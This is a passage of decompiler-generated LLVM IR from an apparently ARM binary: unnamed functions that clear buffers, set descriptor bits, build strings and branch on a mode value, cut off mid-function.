  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9a20 = load i32, i32* @r4, align 4
  store i32 %v3_9a20, i32* %stack_var_-20, align 4
  %v6_9a20 = load i32, i32* @r5, align 4
  %v1_9a24 = add i32 %arg1, 18
  store i32 %v1_9a24, i32* @r5, align 4
  store i32 1024, i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %v1_9a24, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9a40 = call i32 @function_aba4(i32 %v1_9a24, i32 0, i32 1024)
  store i32 %v3_9a40, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_9a54 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_9a54

dec_label_pc_9a54:                                ; preds = %dec_label_pc_9a54, %dec_label_pc_9a20
  %v1_9a5c = phi i32 [ %v1_9a60, %dec_label_pc_9a54 ], [ 0, %dec_label_pc_9a20 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9a5c = add i32 %v1_9a5c, %v2_9a54
  %v4_9a5c = inttoptr i32 %v3_9a5c to i32*
  store i32 0, i32* %v4_9a5c, align 4
  %v0_9a60 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a60 = add i32 %v0_9a60, 4
  store i32 %v1_9a60, i32* %r2.global-to-local, align 4
  %v7_9a64 = icmp eq i32 %v1_9a60, 128
  br i1 %v7_9a64, label %dec_label_pc_9a6c, label %dec_label_pc_9a54

dec_label_pc_9a6c:                                ; preds = %dec_label_pc_9a54
  %v16_9a20 = ptrtoint i32* %stack_var_-20 to i32
  %v0_9a6c = load i32, i32* @r4, align 4
  %v1_9a6c = add i32 %v0_9a6c, 8
  %v2_9a6c = inttoptr i32 %v1_9a6c to i32*
  %v3_9a6c = load i32, i32* %v2_9a6c, align 4
  store i32 %v3_9a6c, i32* %r0.global-to-local, align 4
  store i32 %v16_9a20, i32* %r2.global-to-local, align 4
  %v3_9a74 = udiv i32 %v3_9a6c, 32
  store i32 %v3_9a74, i32* %r3.global-to-local, align 4
  %v4_9a78 = mul nuw nsw i32 %v3_9a74, 4
  %v5_9a78 = add i32 %v4_9a78, %v16_9a20
  store i32 %v5_9a78, i32* @lr, align 4
  %v1_9a7c = add i32 %v5_9a78, -136
  %v2_9a7c = inttoptr i32 %v1_9a7c to i32*
  %v3_9a7c = load i32, i32* %v2_9a7c, align 4
  %v1_9a80 = urem i32 %v3_9a6c, 32
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_9a88 = shl i32 1, %v1_9a80
  %v8_9a88 = or i32 %v3_9a7c, %v7_9a88
  %v0_9a8c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_9a8c, i32* %r2.global-to-local, align 4
  store i32 %v8_9a88, i32* %v2_9a7c, align 4
  %v0_9a94 = load i32, i32* %r0.global-to-local, align 4
  %v1_9a94 = load i32, i32* %r3.global-to-local, align 4
  %v2_9a94 = add i32 %v1_9a94, %v0_9a94
  store i32 %v2_9a94, i32* %r0.global-to-local, align 4
  store i32 %v2_9a54, i32* %r1.global-to-local, align 4
  store i32 %v0_9a8c, i32* %r3.global-to-local, align 4
  %v5_9aa8 = call i32 @function_ba74(i32 %v2_9a94, i32 %v2_9a54, i32 %v0_9a8c, i32 %v0_9a8c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9aa8, i32* %r0.global-to-local, align 4
  %tmp12 = icmp slt i32 %v5_9aa8, 1
  br i1 %tmp12, label %dec_label_pc_9af4, label %dec_label_pc_9ab4

dec_label_pc_9ab4:                                ; preds = %dec_label_pc_9a6c
  %v0_9ab4 = load i32, i32* @r4, align 4
  %v1_9ab4 = add i32 %v0_9ab4, 8
  %v2_9ab4 = inttoptr i32 %v1_9ab4 to i32*
  %v3_9ab4 = load i32, i32* %v2_9ab4, align 4
  store i32 %v3_9ab4, i32* %r0.global-to-local, align 4
  %v0_9ab8 = load i32, i32* @r5, align 4
  store i32 %v0_9ab8, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9ac4 = inttoptr i32 %v0_9ab8 to i32*
  %v5_9ac4 = call i32 @function_bfec(i32 %v3_9ab4, i32* %v4_9ac4, i32 1024, i32 16384)
  store i32 %v5_9ac4, i32* %r0.global-to-local, align 4
  %tmp13 = icmp slt i32 %v5_9ac4, 1
  br i1 %tmp13, label %dec_label_pc_9af4, label %dec_label_pc_9ad0

dec_label_pc_9ad0:                                ; preds = %dec_label_pc_9ab4
  %v0_9ad0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9ad0, i32* @r0, align 4
  %v0_9ad4 = call i32 @function_ab0c()
  store i32 %v0_9ad0, i32* %r2.global-to-local, align 4
  store i32 %v0_9ad4, i32* %r3.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_9ae4 = load i32, i32* @r5, align 4
  store i32 %v0_9ae4, i32* %r0.global-to-local, align 4
  %v4_9ae8 = call i32 @function_ad54(i32 %v0_9ae4, i32 1024, i32 %v0_9ad0, i32 %v0_9ad4)
  %v3_9aec = icmp eq i32 %v4_9ae8, -1
  br i1 %v3_9aec, label %dec_label_pc_9af4, label %dec_label_pc_9af8

dec_label_pc_9af4:                                ; preds = %dec_label_pc_9ad0, %dec_label_pc_9ab4, %dec_label_pc_9a6c
  br label %dec_label_pc_9af8

dec_label_pc_9af8:                                ; preds = %dec_label_pc_9ad0, %dec_label_pc_9af4
  %storemerge = phi i32 [ 0, %dec_label_pc_9af4 ], [ %v4_9ae8, %dec_label_pc_9ad0 ]
  %v17_9afc = phi i32 [ 0, %dec_label_pc_9af4 ], [ %v4_9ae8, %dec_label_pc_9ad0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_9afc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_9afc, i32* @r4, align 4
  store i32 %v6_9a20, i32* @r5, align 4
  ret i32 %v17_9afc

; uselistorder directives
  uselistorder i32 %v0_9ad0, { 1, 0, 2 }
  uselistorder i32 %v0_9a8c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_9a74, { 1, 0 }
  uselistorder i32 %v3_9a6c, { 1, 0, 2 }
  uselistorder i32 %v1_9a60, { 1, 2, 0 }
  uselistorder i32 %v2_9a54, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 4, 3, 8, 5, 6, 7, 10, 9, 1 }
  uselistorder label %dec_label_pc_9af8, { 1, 0 }
}

define i32 @function_9b00() local_unnamed_addr {
dec_label_pc_9b00:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_9b00 = load i32, i32* @r4, align 4
  store i32 %v3_9b00, i32* %stack_var_-12, align 4
  %v0_9b04 = load i32, i32* @r0, align 4
  store i32 %v0_9b04, i32* %r5.global-to-local, align 4
  %v0_9b0c = load i32, i32* @r1, align 4
  store i32 %v0_9b0c, i32* @r4, align 4
  %v2_9b10 = call i32 @function_bad0(i32* null)
  %v0_9b14 = load i32, i32* @r4, align 4
  %v1_9b14 = trunc i32 %v0_9b14 to i8
  %v3_9b14 = add i32 %v0_9b04, 16
  %v4_9b14 = inttoptr i32 %v3_9b14 to i8*
  store i8 %v1_9b14, i8* %v4_9b14, align 1
  %v1_9b18 = load i32, i32* %r5.global-to-local, align 4
  %v2_9b18 = add i32 %v1_9b18, 12
  %v3_9b18 = inttoptr i32 %v2_9b18 to i32*
  store i32 %v2_9b10, i32* %v3_9b18, align 4
  %v2_9b1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_9b1c, i32* @r4, align 4
  ret i32 %v2_9b10
}

define i32 @function_9b20(i32 %arg1, i8 %arg2) local_unnamed_addr {
dec_label_pc_9b20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_9b20 = load i32, i32* @r4, align 4
  store i32 %v3_9b20, i32* %stack_var_-12, align 4
  %v9_9b20 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_9b30 = call i32 @function_bad0(i32* null)
  %v2_9b34 = add i32 %arg1, 12
  %v3_9b34 = inttoptr i32 %v2_9b34 to i32*
  store i32 %v2_9b30, i32* %v3_9b34, align 4
  %v0_9b38 = load i32, i32* %r5.global-to-local, align 4
  %v1_9b38 = add i32 %v0_9b38, 8
  %v2_9b38 = inttoptr i32 %v1_9b38 to i32*
  %v3_9b38 = load i32, i32* %v2_9b38, align 4
  %v1_9b3c = call i32 @function_b880(i32 %v3_9b38)
  %v0_9b44 = load i32, i32* @r4, align 4
  %v2_9b44 = icmp eq i32 %v0_9b44, 0
  store i1 %v2_9b44, i1* %cpsr_z.global-to-local, align 1
  %v2_9b48 = load i32, i32* %r5.global-to-local, align 4
  %v3_9b48 = add i32 %v2_9b48, 16
  %v4_9b48 = inttoptr i32 %v3_9b48 to i8*
  store i8 0, i8* %v4_9b48, align 1
  %v0_9b4c = load i32, i32* @r4, align 4
  %v1_9b4c = trunc i32 %v0_9b4c to i8
  %v2_9b4c = load i32, i32* %r5.global-to-local, align 4
  %v3_9b4c = add i32 %v2_9b4c, 17
  %v4_9b4c = inttoptr i32 %v3_9b4c to i8*
  store i8 %v1_9b4c, i8* %v4_9b4c, align 1
  %v0_9b50 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9b50, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_9b20
  %v3_9b50 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_9b50, i32* @r4, align 4
  ret i32 %v1_9b3c

bb5:                                              ; preds = %dec_label_pc_9b20
  %v0_9b54 = load i32, i32* %r5.global-to-local, align 4
  %v1_9b54 = add i32 %v0_9b54, 1044
  %v2_9b54 = inttoptr i32 %v1_9b54 to i32*
  %v3_9b54 = load i32, i32* %v2_9b54, align 4
  %v2_9b58 = icmp eq i32 %v3_9b54, 0
  store i1 %v2_9b58, i1* %cpsr_z.global-to-local, align 1
  %v3_9b5c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_9b5c, i32* @r4, align 4
  br i1 %v2_9b58, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  ret i32 0

bb7:                                              ; preds = %bb5
  store i32 %v9_9b20, i32* @lr, align 4
  %v1_9b64 = call i32 @function_c3a4(i32 %v3_9b54)
  ret i32 %v1_9b64

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
}

define i32 @function_9b68() local_unnamed_addr {
dec_label_pc_9b68:
  %stack_var_-12 = alloca i32, align 4
  %v3_9b68 = load i32, i32* @r4, align 4
  store i32 %v3_9b68, i32* %stack_var_-12, align 4
  %v6_9b68 = load i32, i32* @r5, align 4
  %v9_9b68 = load i32, i32* @lr, align 4
  %v0_9b6c = load i32, i32* @r0, align 4
  %v0_9b74 = load i32, i32* @r1, align 4
  %v3_9b74 = mul i32 %v0_9b74, 65536
  store i32 %v3_9b74, i32* @r4, align 4
  %v2_9b78 = call i32 @function_bad0(i32* null)
  %v1_9b7c = add i32 %v0_9b6c, 12
  %v2_9b7c = inttoptr i32 %v1_9b7c to i32*
  %v3_9b7c = load i32, i32* %v2_9b7c, align 4
  %v0_9b80 = load i32, i32* @r4, align 4
  %v3_9b80 = udiv i32 %v0_9b80, 65536
  %v2_9b84 = add i32 %v3_9b80, %v3_9b7c
  %v5_9b94 = icmp slt i32 %v2_9b84, %v2_9b78
  %v2_9b98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_9b98, i32* @r4, align 4
  store i32 %v6_9b68, i32* @r5, align 4
  br i1 %v5_9b94, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_9b68
  ret i32 %v0_9b6c

bb4:                                              ; preds = %dec_label_pc_9b68
  store i32 %v9_9b68, i32* @lr, align 4
  %v3_9b9c = call i32 @function_9b20(i32 %v0_9b6c, i8 1)
  ret i32 %v3_9b9c

; uselistorder directives
  uselistorder i32 %v0_9b6c, { 1, 2, 0 }
  uselistorder i32 (i32*)* @function_bad0, { 0, 2, 1, 3 }
}

define i32 @function_9ba0(i32 %arg1) local_unnamed_addr {
dec_label_pc_9ba0:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp136 = call i32 @__decompiler_undefined_function_0()
  %tmp142 = call i32 @__decompiler_undefined_function_0()
  %tmp143 = call i8 @__decompiler_undefined_function_1()
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp145 = call i32 @__decompiler_undefined_function_0()
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-1280 = alloca i32, align 4
  %stack_var_-2304 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_9ba0 = load i32, i32* @r4, align 4
  store i32 %v3_9ba0, i32* %stack_var_-36, align 4
  %v6_9ba0 = load i32, i32* @r5, align 4
  %v9_9ba0 = load i32, i32* @r6, align 4
  %v12_9ba0 = load i32, i32* @r7, align 4
  %v1_9ba8 = urem i32 %arg1, 256
  store i32 %v1_9ba8, i32* @sb, align 4
  %v0_9bac = call i32 @function_b8ac()
  store i32 %v0_9bac, i32* %r0.global-to-local, align 4
  %v7_9bb0 = icmp eq i32 %v0_9bac, -1
  %. = zext i1 %v7_9bb0 to i32
  %tmp176 = icmp slt i32 %v0_9bac, 1
  %storemerge134 = select i1 %tmp176, i32 %., i32 1
  store i32 %storemerge134, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1743c.130 to i32), i32* %r3.global-to-local, align 4
  %v2_9bcc = icmp eq i32 %storemerge134, 0
  store i32 %v0_9bac, i32* @global_var_1743c.130, align 4
  br i1 %v2_9bcc, label %dec_label_pc_9bd8, label %dec_label_pc_a938

dec_label_pc_9bd8:                                ; preds = %dec_label_pc_9ba0
  %v0_9bd8 = call i32 @function_9444()
  store i32 %v0_9bd8, i32* %r0.global-to-local, align 4
  %v0_9bdc = call i32 @function_b8d8()
  store i32 %v0_9bdc, i32* @r6, align 4
  store i32 84, i32* %r0.global-to-local, align 4
  %v1_9be8 = call i32 @function_c9d0(i32 84)
  store i32 %v1_9be8, i32* %r0.global-to-local, align 4
  %v0_9bec = load i32, i32* @r4, align 4
  store i32 %v0_9bec, i32* %stack_var_-40, align 4
  store i32 %v1_9be8, i32* @r5, align 4
  %v0_9bf4 = call i32 @function_939c()
  store i32 %v0_9bf4, i32* %r0.global-to-local, align 4
  %v0_9bf8 = load i32, i32* @r5, align 4
  store i32 %v0_9bf4, i32* @r7, align 4
  %tmp179 = icmp slt i32 %v0_9bf8, 1
  br i1 %tmp179, label %dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge, label %dec_label_pc_9c04

dec_label_pc_9bd8.dec_label_pc_9eb4_crit_edge:    ; preds = %dec_label_pc_9bd8
  %v0_9eb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a2a0

dec_label_pc_9c04:                                ; preds = %dec_label_pc_9bd8
  %v0_9c04 = load i32, i32* @r6, align 4
  %v1_9c04 = add i32 %v0_9c04, -100
  %v7_9c08 = icmp eq i32 %v0_9bf8, 1
  %v3_9c0c = mul i32 %v1_9c04, 65536
  store i32 %v3_9c0c, i32* %r3.global-to-local, align 4
  %.199 = select i1 %v7_9c08, i32 500, i32 1000
  %v3_9c18 = urem i32 %v1_9c04, 65536
  %v8_9c1c = icmp ult i32 %v3_9c18, %.199
  br i1 %v8_9c1c, label %bb183, label %bb182

bb182:                                            ; preds = %dec_label_pc_9c04
  br label %bb183

bb183:                                            ; preds = %dec_label_pc_9c04, %bb182
  %storemerge219 = phi i32 [ %.199, %bb182 ], [ %v3_9c18, %dec_label_pc_9c04 ]
  %v0_9c28 = phi i32 [ %.199, %bb182 ], [ %v3_9c18, %dec_label_pc_9c04 ]
  store i32 %storemerge219, i32* @fp, align 4
  store i32 1048, i32* %r1.global-to-local, align 4
  store i32 %v0_9c28, i32* %r0.global-to-local, align 4
  %v2_9c2c = call i32 @function_c34c(i32 %v0_9c28, i32 1048)
  store i32 2056, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_9c3c = load i32, i32* @r4, align 4
  store i32 %v0_9c3c, i32* %stack_var_-44, align 4
  %v3_9c40 = call i32 @function_c34c(i32 1, i32 2056)
  store i32 %v3_9c40, i32* %r0.global-to-local, align 4
  %v0_9c44 = load i32, i32* @sb, align 4
  %v7_9c44 = icmp eq i32 %v0_9c44, 2
  %v0_9c48 = load i32, i32* @r4, align 4
  store i32 %v0_9c48, i32* @r6, align 4
  store i32 %v3_9c40, i32* @r5, align 4
  br i1 %v7_9c44, label %dec_label_pc_9ec0, label %dec_label_pc_9c54

dec_label_pc_9c54:                                ; preds = %bb183
  %v7_9c54 = icmp eq i32 %v0_9c44, 3
  br i1 %v7_9c54, label %dec_label_pc_9c5c, label %dec_label_pc_9e34

dec_label_pc_9c5c:                                ; preds = %dec_label_pc_9c54
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_9c60 = load i32, i32* @r7, align 4
  store i32 %v0_9c60, i32* %r0.global-to-local, align 4
  %v2_9c64 = call i32 @function_b5dc(i32 %v0_9c60, i32 5)
  %v1_9c68 = add i32 %v2_9c64, 5
  store i32 %v1_9c68, i32* @r4, align 4
  store i32 %v1_9c68, i32* %r1.global-to-local, align 4
  %v2_9c74 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_9c74, i32* %r0.global-to-local, align 4
  %v2_9c78 = call i32 @function_93f4(i32 %v2_9c74, i32 %v1_9c68)
  %v2_9c7c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_9c7c, i32* %r1.global-to-local, align 4
  %v1_9c80 = load i32, i32* @r4, align 4
  %v2_9c80 = add i32 %v1_9c80, %v2_9c7c
  store i32 %v2_9c80, i32* %r3.global-to-local, align 4
  %v0_9c84 = load i32, i32* @r6, align 4
  %v1_9c84 = trunc i32 %v0_9c84 to i8
  %v3_9c84 = add i32 %v2_9c80, -60
  %v4_9c84 = inttoptr i32 %v3_9c84 to i8*
  store i8 %v1_9c84, i8* %v4_9c84, align 1
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_9c8c = call i32 @function_81cc(i32 28)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_9c94 = call i32 @function_81cc(i32 27)
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_9c9c = call i32 @function_81cc(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_9ca4 = call i32 @function_81cc(i32 30)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_9cac = call i32 @function_83d0(i32 30)
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_9cb8 = call i32 @function_83d0(i32 28)
  store i32 %v1_9cb8, i32* @r6, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_9cc4 = call i32 @function_83d0(i32 27)
  store i32 %v1_9cc4, i32* @r4, align 4
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_9cd0 = call i32 @function_83d0(i32 29)
  br label %dec_label_pc_9cd8

dec_label_pc_9cd8:                                ; preds = %dec_label_pc_9d94, %dec_label_pc_9c5c
  %v0_9cd8 = load i32, i32* @r4, align 4
  store i32 %v0_9cd8, i32* %r0.global-to-local, align 4
  %v1_9cdc = call i32 @function_94a0(i32 %v0_9cd8)
  store i32 %v1_9cdc, i32* %r0.global-to-local, align 4
  %v2_9ce0 = icmp eq i32 %v1_9cdc, 0
  %v1_9ce4 = load i32, i32* @r5, align 4
  %v2_9ce4 = inttoptr i32 %v1_9ce4 to i32*
  store i32 %v1_9cdc, i32* %v2_9ce4, align 4
  br i1 %v2_9ce0, label %dec_label_pc_9d94, label %dec_label_pc_9cec

dec_label_pc_9cec:                                ; preds = %dec_label_pc_9cd8
  %v0_9cec = load i32, i32* @r6, align 4
  store i32 %v0_9cec, i32* %r0.global-to-local, align 4
  %v1_9cf0 = call i32 @function_94a0(i32 %v0_9cec)
  store i32 %v1_9cf0, i32* %r0.global-to-local, align 4
  %v2_9cf4 = icmp eq i32 %v1_9cf0, 0
  %v1_9cf8 = load i32, i32* @r5, align 4
  %v2_9cf8 = add i32 %v1_9cf8, 4
  %v3_9cf8 = inttoptr i32 %v2_9cf8 to i32*
  store i32 %v1_9cf0, i32* %v3_9cf8, align 4
  br i1 %v2_9cf4, label %dec_label_pc_9d94, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cec
  %v0_9d00 = load i32, i32* @r5, align 4
  %v1_9d00 = inttoptr i32 %v0_9d00 to i32*
  %v2_9d00 = load i32, i32* %v1_9d00, align 4
  store i32 %v2_9d00, i32* %r3.global-to-local, align 4
  %v2_9d04 = icmp eq i32 %v2_9d00, 0
  br i1 %v2_9d04, label %dec_label_pc_9d94, label %dec_label_pc_9d0c

dec_label_pc_9d0c:                                ; preds = %dec_label_pc_9d00
  %v2_9d10 = ptrtoint i32* %stack_var_-2304 to i32
  store i32 %v2_9d10, i32* @r4, align 4
  store i32 ptrtoint ([26 x i8]* @global_var_e2fc.140 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_9d10, i32* @r0, align 4
  %v3_9d1c = call i32 @function_ab78(i32 %v2_9d10, i32 ptrtoint ([26 x i8]* @global_var_e2fc.140 to i32))
  store i32 %v3_9d1c, i32* %r0.global-to-local, align 4
  %v0_9d20 = load i32, i32* @r5, align 4
  %v1_9d20 = add i32 %v0_9d20, 4
  %v2_9d20 = inttoptr i32 %v1_9d20 to i32*
  %v3_9d20 = load i32, i32* %v2_9d20, align 4
  store i32 %v3_9d20, i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v2_9d28 = bitcast i32* %stack_var_-2304 to i8*
  %v3_9d28 = call i32 @function_ab2c(i8* %v2_9d28, i32 %v3_9d20)
  store i32 ptrtoint ([8 x i8]* @global_var_e318.142 to i32), i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v4_9d34 = call i32 @function_ab2c(i8* %v2_9d28, i32 ptrtoint ([8 x i8]* @global_var_e318.142 to i32))
  store i32 %v4_9d34, i32* %r0.global-to-local, align 4
  %v0_9d38 = load i32, i32* @r5, align 4
  %v1_9d38 = inttoptr i32 %v0_9d38 to i32*
  %v2_9d38 = load i32, i32* %v1_9d38, align 4
  store i32 %v2_9d38, i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v3_9d40 = call i32 @function_ab2c(i8* %v2_9d28, i32 %v2_9d38)
  store i32 ptrtoint (i32* @global_var_e314.144 to i32), i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v3_9d4c = call i32 @function_ab2c(i8* %v2_9d28, i32 ptrtoint (i32* @global_var_e314.144 to i32))
  store i32 ptrtoint ([27 x i8]* @global_var_e320.146 to i32), i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v4_9d58 = call i32 @function_ab2c(i8* %v2_9d28, i32 ptrtoint ([27 x i8]* @global_var_e320.146 to i32))
  store i32 %v2_9c74, i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v3_9d68 = call i32 @function_ab2c(i8* %v2_9d28, i32 %v2_9c74)
  store i32 %v2_9d10, i32* @r0, align 4
  %v0_9d70 = call i32 @function_ab0c()
  store i32 %v0_9d70, i32* @r8, align 4
  %v2_9d7c = ptrtoint i32* %stack_var_-1280 to i32
  store i32 %v2_9d7c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v3_9d88 = call i32 @function_aba4(i32 %v2_9d7c, i32 0, i32 1024)
  store i32 %v3_9d88, i32* %r0.global-to-local, align 4
  %v2_9dac = ptrtoint i32* %stack_var_-128 to i32
  %v2_9dd8 = bitcast i32* %stack_var_-1280 to i8*
  br label %dec_label_pc_9de0

dec_label_pc_9d94:                                ; preds = %dec_label_pc_9d00, %dec_label_pc_9cec, %dec_label_pc_9cd8
  %v0_9d94 = load i32, i32* @r5, align 4
  store i32 %v0_9d94, i32* %r0.global-to-local, align 4
  %v1_9d98 = call i32 @function_c3a4(i32 %v0_9d94)
  store i32 300, i32* %r0.global-to-local, align 4
  %v1_9da0 = call i32 @function_c82c(i32 300)
  br label %dec_label_pc_9cd8

dec_label_pc_9da8:                                ; preds = %dec_label_pc_9de0
  store i32 %v2_9dac, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  %v3_9dbc = call i32 @function_aba4(i32 %v2_9dac, i32 0, i32 32)
  store i32 %v3_9dbc, i32* %r0.global-to-local, align 4
  %v0_9dc0 = load i32, i32* @r6, align 4
  %v1_9dc0 = load i32, i32* @r5, align 4
  %v2_9dc0 = add i32 %v1_9dc0, %v0_9dc0
  %v3_9dc0 = inttoptr i32 %v2_9dc0 to i8*
  %v4_9dc0 = load i8, i8* %v3_9dc0, align 1
  %v6_9dc0 = zext i8 %v4_9dc0 to i32
  store i32 %v2_9dac, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_e33c.148 to i32), i32* %r1.global-to-local, align 4
  %v4_9dcc = call i32 @function_b410(i32 %v2_9dac, i32 ptrtoint ([3 x i8]* @global_var_e33c.148 to i32), i32 %v6_9dc0)
  store i32 %v2_9d7c, i32* %r0.global-to-local, align 4
  store i32 %v2_9dac, i32* @r1, align 4
  %v3_9dd8 = call i32 @function_ab2c(i8* %v2_9dd8, i32 %v2_9dac)
  store i32 %v3_9dd8, i32* %r0.global-to-local, align 4
  %v0_9ddc = load i32, i32* @r6, align 4
  %v1_9ddc = add i32 %v0_9ddc, 1
  br label %dec_label_pc_9de0

dec_label_pc_9de0:                                ; preds = %dec_label_pc_9d0c, %dec_label_pc_9da8
  %storemerge = phi i32 [ 0, %dec_label_pc_9d0c ], [ %v1_9ddc, %dec_label_pc_9da8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_9de8 = load i32, i32* @r8, align 4
  store i32 %v2_9d10, i32* @r5, align 4
  store i32 %v2_9d7c, i32* @r7, align 4
  %v5_9df4 = icmp slt i32 %storemerge, %v1_9de8
  br i1 %v5_9df4, label %dec_label_pc_9da8, label %dec_label_pc_9df8

dec_label_pc_9df8:                                ; preds = %dec_label_pc_9de0
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v3_9e04 = call i32 @function_aba4(i32 %v2_9d10, i32 0, i32 1024)
  store i32 ptrtoint ([71 x i8]* @global_var_e340.150 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_9d10, i32* @r0, align 4
  %v3_9e10 = call i32 @function_ab78(i32 %v2_9d10, i32 ptrtoint ([71 x i8]* @global_var_e340.150 to i32))
  store i32 %v2_9d7c, i32* @r1, align 4
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  %v3_9e1c = call i32 @function_ab2c(i8* %v2_9d28, i32 %v2_9d7c)
  store i32 %v2_9d10, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_e388.152 to i32), i32* @r1, align 4
  %v4_9e28 = call i32 @function_ab2c(i8* %v2_9d28, i32 ptrtoint ([5 x i8]* @global_var_e388.152 to i32))
  store i32 %v4_9e28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9ec0

dec_label_pc_9e34:                                ; preds = %dec_label_pc_9c54
  %v7_9e34 = icmp eq i32 %v0_9c44, 1
  br i1 %v7_9e34, label %bb184, label %dec_label_pc_9e44

bb184:                                            ; preds = %dec_label_pc_9e34
  store i32 24465, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9ec4

dec_label_pc_9e44:                                ; preds = %dec_label_pc_9e34
  %v7_9e44 = icmp eq i32 %v0_9c44, 4
  br i1 %v7_9e44, label %dec_label_pc_9e4c, label %dec_label_pc_a2a0

dec_label_pc_9e4c:                                ; preds = %dec_label_pc_9e44
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_9e50 = call i32 @function_c1f8(i32 12)
  store i32 %v1_9e50, i32* %r3.global-to-local, align 4
  store i32 %v1_9e50, i32* @global_var_17444.156, align 4
  store i32 ptrtoint (i32* @global_var_17448.135 to i32), i32* %ip.global-to-local, align 4
